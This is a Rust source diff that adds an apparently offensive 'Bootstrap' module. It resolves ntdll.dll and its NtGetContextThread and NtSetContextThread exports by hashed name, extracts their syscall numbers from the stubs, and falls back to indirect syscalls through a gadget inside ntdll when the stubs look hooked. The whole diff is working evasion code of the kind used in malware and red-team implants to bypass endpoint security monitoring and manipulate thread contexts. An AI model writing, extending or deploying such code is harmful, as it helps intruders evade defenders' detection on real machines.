@@ -1,4 +1,6 @@
 use core::arch::naked_asm;
+use opsec_peb::{ModuleHandle, resolve_module, resolve_export};
+use opsec_strcrypt::hash;
 
 /// Extract SSN from clean NT stub: `4C 8B D1  B8 ?? ?? ?? ??  ...`
 /// Returns Some(ssn) if unhooked, None if the prologue looks patched.
@@ -32,5 +34,101 @@ pub unsafe extern "system" fn indirect_syscall4(
             "mov r11, [rsp + 0x30]",
             "jmp r11",
         );
+    }
+}
+
+#[derive(Debug)]
+pub enum Error {
+    NtdllNotFound,
+    StubNotFound(&'static str),
+    GadgetNotFound,
+}
+
+pub struct Bootstrap {
+    pub ntdll: ModuleHandle,
+    pub gadget: usize,
+    pub get_ctx: *const u8,
+    pub get_ctx_ssn: u32,
+    pub set_ctx: *const u8,
+    pub set_ctx_ssn: u32,
+}
+
+impl Bootstrap {
+    pub unsafe fn init() -> Result<Self, Error> {
+        let ntdll = unsafe {
+            resolve_module(hash!("ntdll.dll")).ok_or(Error::NtdllNotFound)?
+        };
+
+        let get_ctx = unsafe {
+            resolve_export(ntdll, hash!("NtGetContextThread"))
+                .ok_or(Error::StubNotFound("NtGetContextThread"))? as *const u8
+        };
+        let set_ctx = unsafe {
+            resolve_export(ntdll, hash!("NtSetContextThread"))
+                .ok_or(Error::StubNotFound("NtSetContextThread"))? as *const u8
+        };
+
+        let get_ctx_ssn = unsafe {
+            extract_ssn(get_ctx).unwrap_or(0)
+        };
+        let set_ctx_ssn = unsafe {
+            extract_ssn(set_ctx).unwrap_or(0)
+        };
+
+        let size = unsafe { pe_size_of_image(ntdll) };
+        let gadget = unsafe {
+            crate::gadget::find_syscall_ret(ntdll.as_usize(), size)
+                .ok_or(Error::GadgetNotFound)?
+        };
+
+        Ok(Bootstrap { ntdll, gadget, get_ctx, get_ctx_ssn, set_ctx, set_ctx_ssn })
+    }
+
+    pub unsafe fn nt_get_context_thread(
+        &self,
+        thread: *mut core::ffi::c_void,
+        context: *mut core::ffi::c_void,
+    ) -> i32 {
+        unsafe {
+            if extract_ssn(self.get_ctx).is_some() {
+                type Fn = unsafe extern "system" fn(*mut core::ffi::c_void, *mut core::ffi::c_void) -> i32;
+                let f: Fn = core::mem::transmute(self.get_ctx);
+                f(thread, context)
+            } else {
+                indirect_syscall4(
+                    thread as usize, context as usize, 0, 0,
+                    self.get_ctx_ssn, self.gadget,
+                )
+            }
+        }
+    }
+
+    pub unsafe fn nt_set_context_thread(
+        &self,
+        thread: *mut core::ffi::c_void,
+        context: *const core::ffi::c_void,
+    ) -> i32 {
+        unsafe {
+            if extract_ssn(self.set_ctx).is_some() {
+                type Fn = unsafe extern "system" fn(*mut core::ffi::c_void, *const core::ffi::c_void) -> i32;
+                let f: Fn = core::mem::transmute(self.set_ctx);
+                f(thread, context)
+            } else {
+                indirect_syscall4(
+                    thread as usize, context as usize, 0, 0,
+                    self.set_ctx_ssn, self.gadget,
+                )
+            }
+        }
+    }
+}
+
+unsafe fn pe_size_of_image(m: ModuleHandle) -> usize {
+    unsafe {
+        let base = m.as_usize();
+        let e_lfanew = core::ptr::read_unaligned((base + 0x3C) as *const u32) as usize;
+        // PE32+ optional header: SizeOfImage is at offset 56 within optional header
+        let opt = base + e_lfanew + 24;
+        core::ptr::read_unaligned((opt + 56) as *const u32) as usize
     }
 }
